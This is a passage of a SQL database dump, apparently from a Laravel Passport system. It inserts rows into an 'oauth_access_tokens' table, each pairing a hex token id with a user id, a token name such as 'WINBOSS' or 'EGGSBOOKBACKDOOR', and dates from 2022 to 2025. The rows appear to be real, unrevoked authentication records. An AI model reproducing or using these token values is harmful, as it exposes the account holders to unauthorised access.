('52de96f91f2352f478042197f94a3ca5d416aaae9a4b9d723493c8ceafb4bb3326f1d9d82e92a8ae', '591512', 5, 'WINBOSS', '[]', 0, '2022-12-10 13:15:41', '2022-12-10 13:15:41', '2023-12-10 13:15:41'),
('52ebdae9ab4ea0d69bcf1ab0cb44202c227345aa501979e1b0fba8cb8482ce0448895f814b269f41', '790535', 5, 'WINBOSS', '[]', 0, '2023-02-28 14:40:25', '2023-02-28 14:40:25', '2024-02-28 14:40:25'),
('52f80ce99fa0a077cf122737c24cb50a762d43fa228c9fd2c00381b736be17f822ea15c93abc17b2', '612648', 5, 'WINBOSS', '[]', 0, '2022-12-07 14:35:02', '2022-12-07 14:35:02', '2023-12-07 14:35:02'),
('52fcbe058da3803993e9411ee29e29c6132a3d3210dc20fbed8cd285f8f7e21514a57cc44a27799e', '714254', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-09-01 05:36:49', '2022-09-01 05:36:49', '2023-09-01 05:36:49'),
('531c4d65ffcb5d427020af87713a617a1b18a5e0e922e95228f93ab901705efa02424fbe110198c0', '125200', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-09-25 05:45:05', '2023-09-25 05:45:05', '2024-09-25 05:45:05'),
('534056b26916aa74adc122f99368cb3cffd554970160eb0131079969776958c238052d35ab2c93d7', '449856', 5, 'WINBOSS', '[]', 0, '2023-01-19 16:19:05', '2023-01-19 16:19:05', '2024-01-19 16:19:05'),
('53429221563d027c31327dbd5f69088d3d3fb68627680ef63c1aa1a5cb3195787c339422b35a7b27', '103139', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-02-17 09:58:51', '2023-02-17 09:58:51', '2024-02-17 09:58:51'),
('534a97cf8533ec5f9d8e6fd42b9751270aa9d56a9023d3c6832b72c8dddd90a200a78119124999c2', '414313', 5, 'WINBOSS', '[]', 0, '2023-06-29 07:05:56', '2023-06-29 07:05:56', '2024-06-29 07:05:56'),
('535acccf2d55ede3e831a6de75ea600e499988b4eaf9c3f45f10ba6d023c3fb5bf266640da68cbac', '900949', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-04-18 08:15:45', '2023-04-18 08:15:45', '2024-04-18 08:15:45'),
('53625e5f37a81f273dca71b93e5cad635044f0e9bcd761bb0e43f72bc2951cdaef09cf9582badee6', '824812', 5, 'WINBOSS', '[]', 0, '2022-11-07 02:11:02', '2022-11-07 02:11:02', '2023-11-07 02:11:02'),
('53d1c6f4d0e8e562fe1b6c41b9f1e9bceb25b1b7ba4f47c55af8ce66d1423aaea5b76b8317f1bc14', '329212', 5, 'WINBOSS', '[]', 0, '2023-07-11 04:47:53', '2023-07-11 04:47:53', '2024-07-11 04:47:53'),
('544935fe658f8a48fd3d205bd6f8bed3f3e434900596f6e1fc02ee3207486c967ca471f55011eb75', '546699', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-12-30 06:27:35', '2023-12-30 06:27:35', '2024-12-30 06:27:35'),
('5450a337b6a6d58a6801ddb9eb08d524a3f73e4ec20c5f9685b6e3f0063c36941b5d87e4ae94908b', '403963', 5, 'WINBOSS', '[]', 0, '2023-01-02 09:20:25', '2023-01-02 09:20:25', '2024-01-02 09:20:25'),
('54590d25f2f5aafec0362c63ab39279e35388ae99c25b4b7e5ab6b839b79593d71f05f1c1d380e2f', '254873', 5, 'WINBOSS', '[]', 0, '2023-03-20 15:45:35', '2023-03-20 15:45:35', '2024-03-20 15:45:35'),
('545a61869f34ee23a619dd2160d5016b3208c980962474ef0750b9af71704b47e5b0dc3c320e732d', '525393', 5, 'WINBOSS', '[]', 0, '2023-11-18 11:54:27', '2023-11-18 11:54:27', '2024-11-18 11:54:27'),
('54616213dded7915031ee98204468aedcbd02c734a092058a23d4eeeef2702450342db26b426dc8a', '724449', 5, 'WINBOSS', '[]', 0, '2022-12-19 03:49:13', '2022-12-19 03:49:13', '2023-12-19 03:49:13'),
('546a382b6f7f4b1dc7dd90f018e6da279483baca1970e88e7eeafe6254c0bc2b090d6cb8f431d403', '125200', 5, 'WINBOSS', '[]', 0, '2023-09-04 04:45:37', '2023-09-04 04:45:37', '2024-09-04 04:45:37'),
('54a48ec1c08823f210355bfdf336817056c471745f67a67be1bc6adb5e5541fd679d54358a0637d5', '166548', 5, 'WINBOSS', '[]', 0, '2023-10-11 08:44:35', '2023-10-11 08:44:35', '2024-10-11 08:44:35'),
('54dd66f0919a7922665d8071e3460c05cb993bc75512bf4c12cc37aa5c378b6a2713cca231375b54', '546699', 5, 'WINBOSS', '[]', 0, '2023-12-29 09:06:47', '2023-12-29 09:06:47', '2024-12-29 09:06:47'),
('5551aa219cc00aaddd04600016af023baef9466ad062bd7d89e662405df4d9d681e886ff1c06d1c4', '341177', 5, 'WINBOSS', '[]', 0, '2023-05-31 05:48:07', '2023-05-31 05:48:07', '2024-05-31 05:48:07'),
('5551e2ee2a31e1f1fd0dea1fb39f741204ef897e24625d7d1e5a58d8d2e86cd253ddef887436fa10', '201797', 5, 'WINBOSS', '[]', 0, '2024-01-16 03:57:56', '2024-01-16 03:57:56', '2025-01-16 03:57:56'),
('55671cadb83aeb12f28c6ae63c3f4774c89e7c9bc72c612cb4cc9be66f6dd249ca19235949ea2b28', '412181', 5, 'WINBOSS', '[]', 0, '2023-06-21 13:19:20', '2023-06-21 13:19:20', '2024-06-21 13:19:20'),
('55919c88c4b5dd5abaaf507df81af0d6fdd1e54848a52cd5a5668d0264195f6ac74d4626b14cd6ec', '934704', 5, 'WINBOSS', '[]', 0, '2022-10-13 05:02:56', '2022-10-13 05:02:56', '2023-10-13 05:02:56'),
('55a77e609db39d85ecf44ddc08899abb500e18e6937de4084e573c8541f96d16cd0a0f3344923454', '392722', 5, 'WINBOSS', '[]', 0, '2023-07-31 18:17:18', '2023-07-31 18:17:18', '2024-07-31 18:17:18'),
('55d84b4a13c4f6d4ae4484214114ca43bece663230f7363ac2fdbe375a505057382dbff258956c5d', '854112', 5, 'WINBOSS', '[]', 0, '2024-01-20 16:28:33', '2024-01-20 16:28:33', '2025-01-20 16:28:33'),
('55f073fbf6a135f09be8aba796d734ea7623f97e172d6c66cdcb521af5caffe08f7282e205e84b13', '280558', 5, 'WINBOSS', '[]', 0, '2023-09-05 11:14:30', '2023-09-05 11:14:30', '2024-09-05 11:14:30'),
('56457e51131f9173e77ea59fcb5c71c7e9a218209055900038ad0a37cd07baede5ff34d9c81dbcfb', '383568', 5, 'WINBOSS', '[]', 0, '2022-12-07 14:15:39', '2022-12-07 14:15:39', '2023-12-07 14:15:39'),
('5683161c87b01ddf03f6536468440c35f42af9af693f18cb0efa3862c8187983dd25f7696a0f2550', '652542', 5, 'WINBOSS', '[]', 0, '2022-12-18 16:28:20', '2022-12-18 16:28:20', '2023-12-18 16:28:20'),
('56838b6f32c53de74efce09361b5ab28de80d5203cdb0fe42f6298ff290a9923296cccb59c0ae0fd', '405469', 5, 'WINBOSS', '[]', 0, '2022-12-27 20:39:34', '2022-12-27 20:39:34', '2023-12-27 20:39:34'),
('569f6c851fb10c903e0112ae09b59d5ea0617c28e791dc88064b9bc34be00bcbeb92b9e4e0feca6f', '175153', 5, 'WINBOSS', '[]', 0, '2024-01-21 01:53:09', '2024-01-21 01:53:09', '2025-01-21 01:53:09'),
('56c2e0162231dbe0b7e0dbbe51dbcab08c2f408262d4503d3e7e7ac57ba567d7a3195383d5035308', '483676', 5, 'WINBOSS', '[]', 0, '2023-12-23 06:59:51', '2023-12-23 06:59:51', '2024-12-23 06:59:51'),
('56d13ada0f092dddbaa6584bda1a8f91744e4fce57ffdb3b3a4554e9edb3e3032f440355b991591a', '320366', 5, 'WINBOSS', '[]', 0, '2023-01-01 13:14:41', '2023-01-01 13:14:41', '2024-01-01 13:14:41'),
('56db4a63eb5b25a4f153ec09bc0218b46e2e38414314e9cb404c52bfe5539f8305736728cb842547', '394564', 5, 'WINBOSS', '[]', 0, '2023-01-04 13:46:24', '2023-01-04 13:46:24', '2024-01-04 13:46:24'),
('56fd3c8a1221f52a5c392a23e5e3bc6e296e3933615b8f41e2226c962e1840a21847e3daf944d02c', '801479', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-11-02 10:14:08', '2023-11-02 10:14:08', '2024-11-02 10:14:08'),
('570060e132377d74a4a9fbb2aaa3193dceb26a6261fd3402754528bc9f028d02386d0ec01930d476', '773173', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-09-01 05:16:41', '2022-09-01 05:16:41', '2023-09-01 05:16:41'),
('574d7b4d57eb81d7e5e87ec9caa13518d06e650f8c9af1c668ea710b9735134163b903125018c73e', '378484', 5, 'WINBOSS', '[]', 0, '2023-02-19 16:06:14', '2023-02-19 16:06:14', '2024-02-19 16:06:14'),
('5777f6e7f5e1a0c7b97e5c7f2d6f51695041a454cfa904023ec33db5af27c6815dcedcfb91e4c031', '991798', 5, 'WINBOSS', '[]', 0, '2022-12-26 18:02:38', '2022-12-26 18:02:38', '2023-12-26 18:02:38'),
('57991be692440a4ebaf08c387188264ab6cc60c4b6e90ff7bdc1c8db7bd7bd97148515934695f3a9', '195624', 5, 'BeTNoW', '[]', 0, '2022-12-13 07:24:06', '2022-12-13 07:24:06', '2023-12-13 07:24:06'),
('586075af7e888de321f5e402c658ab3a4a587026df36d085a223224c55fe1c599ce2dd2ef7524228', '689315', 5, 'WINBOSS', '[]', 0, '2022-12-25 21:32:19', '2022-12-25 21:32:19', '2023-12-25 21:32:19'),
('587b7eefd4cc6770598fb5c5e16529fd25488e66dd4a5b0d791efe6d0f6f4b9e1e74f686b1f4ad2f', '934153', 5, 'WINBOSS', '[]', 0, '2022-06-28 08:19:12', '2022-06-28 08:19:12', '2023-06-28 08:19:12'),
('58a53248c56a14c09b09858d0e8a1d0358f46c404549e082c9ff405750681a26cfd0a80aad69103b', '577721', 5, 'WINBOSS', '[]', 0, '2023-11-08 08:22:55', '2023-11-08 08:22:55', '2024-11-08 08:22:55'),
('58c19e4819e59ca0d0f9f3c0e786af66038a44b9a5c6d9ae6bd10abd5b624ebc7aa0847e3c4f88a6', '584865', 5, 'WINBOSS', '[]', 0, '2022-12-30 04:15:04', '2022-12-30 04:15:04', '2023-12-30 04:15:04'),
('58d6b07a46fe9bb08c88a06de22eed47940f5e9d1f3019896c58cdf3006ca7735ac09c5d137eb164', '432090', 5, 'WINBOSS', '[]', 0, '2022-06-28 10:20:31', '2022-06-28 10:20:31', '2023-06-28 10:20:31'),
('59492a58331cb616a832d64e8d8be9f278d35d25fb144a80f8a58584ac3ccf30a2dbfdd5fee50aef', '362519', 5, 'WINBOSS', '[]', 0, '2022-12-10 11:37:37', '2022-12-10 11:37:37', '2023-12-10 11:37:37'),
('59bd6080bfc5eb89b026028a8a807b32972652daeb6780db42b110081aa3913c7a3332ca8a3eeed8', '217197', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:02:18', '2024-01-22 04:02:18', '2025-01-22 04:02:18'),
('59e1e088a7fc3bc1c367bc1586bbecc1b458155d5928d28e65501f4b7bdefa5026a2a84cf95d7b8a', '818155', 5, 'WINBOSS', '[]', 0, '2023-12-23 08:06:42', '2023-12-23 08:06:42', '2024-12-23 08:06:42'),
('59fbdefcc38d97194b196786186053b4a1a89f0c30c1438568e7953fb55f9574ea399990266d66a7', '173065', 5, 'WINBOSS', '[]', 0, '2023-06-20 10:28:24', '2023-06-20 10:28:24', '2024-06-20 10:28:24'),
('5a27033af83cf1cf2964c820e80bf84eeeadab32154e650af23007a3bdd3980b86d7e4dbe18b286d', '884269', 5, 'WINBOSS', '[]', 0, '2023-05-15 03:56:31', '2023-05-15 03:56:31', '2024-05-15 03:56:31'),
('5a295d65f87aacd9fcc43b4b3a271be615942e8045a52bb200af74c7e9b5cef6b0681cb81d94496c', '746441', 5, 'WINBOSS', '[]', 0, '2023-03-21 10:01:22', '2023-03-21 10:01:22', '2024-03-21 10:01:22'),
('5a5a0f0ecb589d1a0d7941011971c2693bbbc3acfddcb5699126b0bcf2c94cf0f94cd28da12315bc', '506214', 5, 'WINBOSS', '[]', 0, '2022-11-19 09:36:46', '2022-11-19 09:36:46', '2023-11-19 09:36:46'),
('5a67cdd270d6fc26e38f03bf36f2abe984f56cbac76cdf87506027cb28c4f82ec9eee229ab933fc3', '149110', 5, 'WINBOSS', '[]', 0, '2022-12-07 15:04:23', '2022-12-07 15:04:23', '2023-12-07 15:04:23'),
('5a6e7fa06f2cf9af62be9cfbd0d1a363464d9144942ed58294b57ba25a42dde5000824553b981da2', '195912', 5, 'WINBOSS', '[]', 0, '2022-10-04 10:24:27', '2022-10-04 10:24:27', '2023-10-04 10:24:27'),
('5aa294c5505ad4bdab99dde28db523b4be30ef697b81533f7742142a4406ede17d6348c243340165', '553297', 5, 'WINBOSS', '[]', 0, '2023-06-03 09:50:09', '2023-06-03 09:50:09', '2024-06-03 09:50:09'),
('5b381d171a4f46fb98fa451cf75c62b1568224175b38b3e3457e1db684a9201521e4f15f07ab4332', '957146', 5, 'WINBOSS', '[]', 0, '2023-05-25 14:44:30', '2023-05-25 14:44:30', '2024-05-25 14:44:30'),
('5be9c436c2fb5e630eb158da87f1d233574e619fe37eca412544a4195106198ceaa7419ed2bdbadc', '690573', 5, 'WINBOSS', '[]', 0, '2023-05-31 03:25:36', '2023-05-31 03:25:36', '2024-05-31 03:25:36'),
('5bebc3c59bf6bc126868ad033f7960a120c498dec6b41b732057a4349d56c869e0e3635fc6c8bf34', '391719', 5, 'WINBOSS', '[]', 0, '2022-12-08 03:53:06', '2022-12-08 03:53:06', '2023-12-08 03:53:06'),
('5c3d6b78a808d573dbc0e3424f09eaecc302e7b5a72bb07c0e86075606781e382f2b17b4784c1c4c', '328126', 5, 'WINBOSS', '[]', 0, '2023-12-30 03:38:19', '2023-12-30 03:38:19', '2024-12-30 03:38:19'),
('5c545923a37d046c0f69a774eb05233be80a648139fbe34723fb0a16483e33e0a5110545d964d633', '251493', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-04-17 05:39:09', '2023-04-17 05:39:09', '2024-04-17 05:39:09'),
('5c5ae0beeb5d37ba256b6cdfa069d2d54cad72ed2abf5f8f5035f38ef9ae0c32ad533aaa0b82b6de', '130240', 5, 'WINBOSS', '[]', 0, '2023-06-29 07:01:38', '2023-06-29 07:01:38', '2024-06-29 07:01:38'),
('5c709c8c18010011c8390e173b415ff1619cbb63db8842ea0dfffce8507af0da5d2fa76148abd202', '696402', 5, 'WINBOSS', '[]', 0, '2023-11-27 03:23:47', '2023-11-27 03:23:47', '2024-11-27 03:23:47'),
('5c7dc471f25accc538b67444a6ac7d0aa8dc0258bd8b82d80d82146692da4d9f260a2a14ec6d5fdc', '998222', 5, 'WINBOSS', '[]', 0, '2022-12-25 20:45:13', '2022-12-25 20:45:13', '2023-12-25 20:45:13'),
('5c84628a1d634418bddf188466c45abc4b2a25818b52e1b36da65872b1ce70fd33dc71ea3ac33d39', '235305', 5, 'WINBOSS', '[]', 0, '2023-02-24 21:37:57', '2023-02-24 21:37:57', '2024-02-24 21:37:57'),
('5d009914c55b553db8596610576d1f7950e24ae13ab796c109d1a32f0eced249dcecdcc9ba68c7a4', '628934', 5, 'WINBOSS', '[]', 0, '2024-01-05 15:21:55', '2024-01-05 15:21:55', '2025-01-05 15:21:55'),
('5d3c0ab0859663706e84f34c4dafc16bf81b51fdedd349493137e3ad66d39878200f7ba63a16e69b', '184235', 5, 'WINBOSS', '[]', 0, '2023-07-25 09:56:30', '2023-07-25 09:56:30', '2024-07-25 09:56:30');
INSERT INTO `oauth_access_tokens` (`id`, `user_id`, `client_id`, `name`, `scopes`, `revoked`, `created_at`, `updated_at`, `expires_at`) VALUES
('5d461f370402f3ef6176670cc38e6a3e09db7945447bddac9ae0040b65126ad4a99edbeeb3e8e98b', '439093', 5, 'WINBOSS', '[]', 0, '2023-07-13 13:00:41', '2023-07-13 13:00:41', '2024-07-13 13:00:41'),
('5d4c71c57bb9ce71cab941385bda739d53eecfd2aa56a3f8b1b8cb206a316feee2a01b834193d5c1', '860834', 5, 'WINBOSS', '[]', 0, '2023-03-29 11:12:42', '2023-03-29 11:12:42', '2024-03-29 11:12:42'),
('5d72e2ee0e7be6b43414d674209782f3f7d124cd6a49904a09fdd94698eb765b87d5bb90a5be04df', '141961', 5, 'WINBOSS', '[]', 0, '2022-12-28 19:29:24', '2022-12-28 19:29:24', '2023-12-28 19:29:24'),
('5d84a3d5d6b24feb36fa52f25bc2310b5012c5f6c9372b32af8ca5827ee185d369bf8034ad9f538f', '954760', 5, 'WINBOSS', '[]', 0, '2022-12-10 10:41:15', '2022-12-10 10:41:15', '2023-12-10 10:41:15'),
('5db0d72a86f4577487b63b2eba25fbb7090039925166a217481810321a2961405daad9cdbb77bc42', '495587', 5, 'WINBOSS', '[]', 0, '2023-01-11 10:57:48', '2023-01-11 10:57:48', '2024-01-11 10:57:48'),
('5e5709c6b3a952d3a6b9b21c33aaff17d5556d7ae6ff37e89663b39a49767cc4401ef3c388f8580e', '793630', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-09-01 04:45:23', '2022-09-01 04:45:23', '2023-09-01 04:45:23'),
('5e99aa62901bd873f7a6a768b58efa6d2d63067f96b94fb249977d3ea2790ba7f59d91ba8a80b414', '940563', 5, 'WINBOSS', '[]', 0, '2022-12-25 20:39:56', '2022-12-25 20:39:56', '2023-12-25 20:39:56'),
('5f3a4129342b23b71814ed49204b938f6767f861faa2ce1902cded64f1915749447495d1970ec855', '740063', 5, 'WINBOSS', '[]', 0, '2023-01-13 08:20:21', '2023-01-13 08:20:21', '2024-01-13 08:20:21'),
('5f4be0f657ec3c0ada009404ca9943826313f80f2cc87a8652309c7aefbc48408032ef3faa48e6f6', '413640', 5, 'WINBOSS', '[]', 0, '2023-04-08 06:23:13', '2023-04-08 06:23:13', '2024-04-08 06:23:13'),
('5f5a18f11f62ec7a60cf24afb96788e490144e408c97f686478ad79c617c02ceb9649ad220dc1dac', '228229', 5, 'WINBOSS', '[]', 0, '2024-01-18 13:12:55', '2024-01-18 13:12:55', '2025-01-18 13:12:55'),
('5f6f7d2405e85be48ca0e9d6ad8174ab8ecb644a98a457d5068c5c458cf8779f1cdddd553d9c65f5', '726570', 5, 'WINBOSS', '[]', 0, '2023-12-25 09:04:05', '2023-12-25 09:04:05', '2024-12-25 09:04:05'),
('5f7a101092e9a9ac6aad57d4ec0d2519fe9060d4309341dc58097f680cc04cd416074f92986fae34', '801173', 5, 'WINBOSS', '[]', 0, '2023-08-15 23:15:13', '2023-08-15 23:15:13', '2024-08-15 23:15:13'),
('5fbfc175b6e320b97ee19bb89197665e2f8eb1712e7238a52dfa74516e841b9a8ccb0c03b61998a1', '225445', 5, 'WINBOSS', '[]', 0, '2023-05-19 15:10:28', '2023-05-19 15:10:28', '2024-05-19 15:10:28'),
('5fd02652456306947bcefb05c10ecc179837d1876a9cdf296a47a17ae5c26a8b9e9445028188a578', '466913', 5, 'WINBOSS', '[]', 0, '2022-12-28 11:50:27', '2022-12-28 11:50:27', '2023-12-28 11:50:27'),
('5ff0736e2ef31354947f2029eacff215a6d3c4c6cc418f7686bee738bd4d6fef830edcdd835a633b', '359059', 5, 'WINBOSS', '[]', 0, '2022-07-09 04:18:52', '2022-07-09 04:18:52', '2023-07-09 04:18:52'),
('5ffbb86f5e9632ee98efe670e47589f462c2094364771d63e494362549aea60223d79f5215ca7490', '892122', 5, 'WINBOSS', '[]', 0, '2022-07-20 10:14:11', '2022-07-20 10:14:11', '2023-07-20 10:14:11'),
('6045edf8bc9bda1822f1b8b49f5fef612293a82de8519e060af50c7d7ae5e78d4d64b1d2f3da5194', '112623', 5, 'WINBOSS', '[]', 0, '2023-10-09 10:40:09', '2023-10-09 10:40:09', '2024-10-09 10:40:09'),
('606ce45533bc85befcc1d19a22bc83dc57a87ae84c881174dac273e0a185d7a32988ef9cc3d8e4ed', '854982', 5, 'WINBOSS', '[]', 0, '2024-01-15 18:49:16', '2024-01-15 18:49:16', '2025-01-15 18:49:16'),
('60795228b38aecd28f8dd01d5d49d734f991dfd0739a81d33f7e82429adb9177b0e2f192871518a5', '174924', 5, 'WINBOSS', '[]', 0, '2023-05-29 08:30:08', '2023-05-29 08:30:08', '2024-05-29 08:30:08'),
('609cf0d8c03b17865799fa68081a762797a942b20a25c1dad89da2ed9496fb28c25e052b5378c758', '935234', 5, 'WINBOSS', '[]', 0, '2022-12-10 10:55:04', '2022-12-10 10:55:04', '2023-12-10 10:55:04'),
('60d9a5da8663f6225f203443cdeb532eee0c45d57698a1d113ce6c2d322bf1511cedb379326d5501', '947048', 5, 'WINBOSS', '[]', 0, '2022-06-30 15:04:55', '2022-06-30 15:04:55', '2023-06-30 15:04:55'),
('60e8e7c2ade290952476244f9bf10db7d197dfd7d71729b889cb8b28d169ff886dc91a34a61ad370', '587444', 5, 'WINBOSS', '[]', 0, '2022-12-18 13:07:11', '2022-12-18 13:07:11', '2023-12-18 13:07:11'),
('610cb917625b07d692e151ed0e057c66f9503fb178eab423e3c30db183064c41b7d60d49d081597e', '970738', 5, 'WINBOSS', '[]', 0, '2023-08-01 06:17:38', '2023-08-01 06:17:38', '2024-08-01 06:17:38'),
('6119aa417ba2cd5bcaaa75992dd40e0878a9baeeb6843596f317775174562837bf1df4a02d93d21d', '232010', 5, 'WINBOSS', '[]', 0, '2023-07-27 05:03:53', '2023-07-27 05:03:53', '2024-07-27 05:03:53'),
('6119cfa27ba822ed611df4b8458d47bf022e3ee18ecaf63b12d66c782f09b3a2ab6909bf5dc4c511', '848170', 5, 'WINBOSS', '[]', 0, '2024-01-05 15:22:35', '2024-01-05 15:22:35', '2025-01-05 15:22:35'),
('615dda88fac0668e2b7658f6e9e18d0661b8fa477c162cb4654e489e9cb41e7196e1571af52a1aa3', '772605', 5, 'WINBOSS', '[]', 0, '2023-12-07 15:51:18', '2023-12-07 15:51:18', '2024-12-07 15:51:18'),
('617b853366a30062864e11d4792e68a1ca1d191906090927b8e2183e0851fbad2611143fa01bcc1f', '908830', 5, 'WINBOSS', '[]', 0, '2022-08-06 04:36:09', '2022-08-06 04:36:09', '2023-08-06 04:36:09'),
('61a365f7cf43c4e6f4a0c730750943546c13178076de1052fbe9a6a486221449899a2fa5bb4890d2', '245176', 5, 'WINBOSS', '[]', 0, '2024-01-22 04:59:11', '2024-01-22 04:59:11', '2025-01-22 04:59:11'),
('61b0e987d64ccfd18be94c3925dcf31b0d7914f39786903f2e3569852bb44464949a630b642d0830', '925420', 5, 'WINBOSS', '[]', 0, '2022-12-08 14:09:13', '2022-12-08 14:09:13', '2023-12-08 14:09:13'),
('61b43baa63491fed9d726cc44bd773330ed95cd4a89ff93e3b560a5f21d4a063760446952fac70e2', '541966', 5, 'WINBOSS', '[]', 0, '2023-10-14 10:04:03', '2023-10-14 10:04:03', '2024-10-14 10:04:03'),
('61bb811e543840737c4e8bf8eb1c2d6c282e6b1d77b4e80d1ada63354fc8147a730a985a181ee3e7', '575787', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2023-10-23 03:40:44', '2023-10-23 03:40:44', '2024-10-23 03:40:44'),
('61c8d4c99cbff0e9b5f979a4f25b978aaa3171543fefd9e49c22179b71f6dfdc1bd1f2fc58aa969e', '523131', 5, 'WINBOSS', '[]', 0, '2022-08-16 04:37:54', '2022-08-16 04:37:54', '2023-08-16 04:37:54'),
('61fd9bfe20c91ccb61aa572c6b26cdc65af3cc4dd3c07a6862017a825a4651709e1a7ce216c87bf0', '709076', 5, 'WINBOSS', '[]', 0, '2023-10-07 10:26:10', '2023-10-07 10:26:10', '2024-10-07 10:26:10'),
('6203e00de548c4bbe0d6e7b6bc0b1242f10e4f36cc65f1eda9069498f090184e450bd03c21c880ad', '678324', 5, 'WINBOSS', '[]', 0, '2022-07-19 04:13:13', '2022-07-19 04:13:13', '2023-07-19 04:13:13'),
('62042653ba03df12b065f1904422129af6d5ecbf0f67d82bcf8678c466e39235e3dc1b1c9fae03b5', '301407', 5, 'WINBOSS', '[]', 0, '2023-10-21 12:10:30', '2023-10-21 12:10:30', '2024-10-21 12:10:30'),
('625f1ed626a18da388e78342a15a27e3e3da26c35c9a5ea188cde21b1cd90c3dbce1b8c28640f4de', '272697', 5, 'WINBOSS', '[]', 0, '2022-12-19 12:53:00', '2022-12-19 12:53:00', '2023-12-19 12:53:00'),
('62df360558b892d91b942d3fd51dd280d1d723e225a727c88709013461acc35349e96a96cf42664b', '736949', 5, 'WINBOSS', '[]', 0, '2023-06-12 13:13:05', '2023-06-12 13:13:05', '2024-06-12 13:13:05'),
('63cf7fe65fccc63e5f22f46c8d67ae9ebb2304dfaffe24afdcee275a1668cae987ea60d557a524d4', '930092', 5, 'BeTNoW', '[]', 0, '2023-06-30 08:33:58', '2023-06-30 08:33:58', '2024-06-30 08:33:58'),
('63d8815382b654cabb26b9ee3e762546aadecfe91cb483670752656a16f9b14032a4752fd6c66cca', '113610', 5, 'WINBOSS', '[]', 0, '2023-07-16 12:04:13', '2023-07-16 12:04:13', '2024-07-16 12:04:13'),
('63fbbb2109f50f7ce0342882b4c045694c5a50eb13da586c9ba7d6fec70569ab2a5c25d709066675', '648485', 5, 'WINBOSS', '[]', 0, '2023-05-28 09:24:44', '2023-05-28 09:24:44', '2024-05-28 09:24:44'),
('64668733f2aabd25090e870e58e3f637e97367d3ef001b4ee4975e3f4e951cc101361798ddc5c50d', '242474', 5, 'WINBOSS', '[]', 0, '2022-07-17 08:28:54', '2022-07-17 08:28:54', '2023-07-17 08:28:54'),
('6481a5d425b9c721488e3f7cd6346f82b6e0d2fe42a80137a27eb3f428d35ce61ea4ab7a93af2f99', '425796', 5, 'WINBOSS', '[]', 0, '2023-01-09 17:37:05', '2023-01-09 17:37:05', '2024-01-09 17:37:05'),
('649c7382bd99096159e9e8af5d66d6f2d8e0445e5a77afd4c587294d9ffe8ee31050297cc477b3cc', '331326', 5, 'WINBOSS', '[]', 0, '2023-06-12 17:43:44', '2023-06-12 17:43:44', '2024-06-12 17:43:44'),
('64b51804ccb845754f73c306cbcf03c6eb664e8fc4e6de606a9b013868b6117020da343ab8153d7f', '111876', 5, 'WINBOSS', '[]', 0, '2024-01-19 14:58:39', '2024-01-19 14:58:39', '2025-01-19 14:58:39'),
('64e4a6f6aa56559817d6521d19620a1bd0e2177d0c2a7a213659ac69bb88682869e51b3c95e1948a', '517170', 5, 'WINBOSS', '[]', 0, '2022-12-19 15:38:07', '2022-12-19 15:38:07', '2023-12-19 15:38:07'),
('64e9ac27160476bfe5fcbc6d98af91b1c500124fb758e13f480579736279f92d8a448a2a66ed5442', '555730', 5, 'WINBOSS', '[]', 0, '2023-10-30 02:36:17', '2023-10-30 02:36:17', '2024-10-30 02:36:17'),
('64f8ba69343d24b6d6f967f9e99a6ef0d5114c23030855a13cedd072181a9948f14aedfe933c09b7', '154988', 5, 'WINBOSS', '[]', 0, '2023-06-16 07:42:20', '2023-06-16 07:42:20', '2024-06-16 07:42:20'),
('653194a171444f50dd646bc41cef9f0c81d0a39a2714b4e05152427398e7ca4a1f50bf389052881f', '272999', 5, 'WINBOSS', '[]', 0, '2022-12-25 23:55:09', '2022-12-25 23:55:09', '2023-12-25 23:55:09'),
('655b2a57ffa40360745b3e6cd3c252113b42985045c3c60ef09c3a39811e692ced2d4d712f7daebd', '684788', 5, 'EGGSBOOKBACKDOOR', '[]', 0, '2022-09-01 04:44:55', '2022-09-01 04:44:55', '2023-09-01 04:44:55'),
('656e3e6c00475230522780120a755c681b2d21ac369e54465fd6f61643a5f978b49d866f94c4a296', '136477', 5, 'WINBOSS', '[]', 0, '2022-12-07 14:45:05', '2022-12-07 14:45:05', '2023-12-07 14:45:05'),
('6637e13a9723a551e79eb5c6a62169396611a2cda4e472bf59e399c88c614470a4b3e6705f31b6c6', '938583', 5, 'WINBOSS', '[]', 0, '2022-08-22 10:49:43', '2022-08-22 10:49:43', '2023-08-22 10:49:43'),
('668e8eca012dcb12900c7328a1f7bb226e604af8ef85452b7f977b4ca7c4def54fe143f57e530eaf', '657433', 5, 'WINBOSS', '[]', 0, '2023-10-23 14:30:25', '2023-10-23 14:30:25', '2024-10-23 14:30:25'),
('6691a303aa9619ff24186ab5f97a9050398dcd6e27ab118dabfb27f269a2f40907b4f182eae7e44d', '812408', 5, 'WINBOSS', '[]', 0, '2022-10-01 10:34:52', '2022-10-01 10:34:52', '2023-10-01 10:34:52'),
('66a6002ed70674c5ade5cb4ec4e4b0c64f59fe78e5153a3180cfb3472133269769a1bb96c27c8ff3', '725655', 5, 'WINBOSS', '[]', 0, '2023-04-07 05:19:55', '2023-04-07 05:19:55', '2024-04-07 05:19:55'),
('66f3e670b5288725654c7c3f61104cfecb15fed1a23368587a54a46e1c036b10d990c1cd55826f1a', '780678', 5, 'WINBOSS', '[]', 0, '2022-12-30 03:51:22', '2022-12-30 03:51:22', '2023-12-30 03:51:22'),
('673978514d1dd068a6d902888e1a12f5215c06f757f69a76d0c3565c2442d0a0bb8d016839521a3d', '896258', 5, 'WINBOSS', '[]', 0, '2022-12-07 15:01:54', '2022-12-07 15:01:54', '2023-12-07 15:01:54'),
('67575b45e967af08a580a89c267512e477f06599d76361f9753f2deb9f033e8ee6eb13f7debb8d2c', '192454', 5, 'WINBOSS', '[]', 0, '2024-01-16 06:55:36', '2024-01-16 06:55:36', '2025-01-16 06:55:36'),
('67a449cd15cf3df6fededbc8b9c877c58e3917c410948ae5d83fc1424616b3b9afbbbfbb70fbc760', '434395', 5, 'WINBOSS', '[]', 0, '2023-12-26 03:05:52', '2023-12-26 03:05:52', '2024-12-26 03:05:52'),
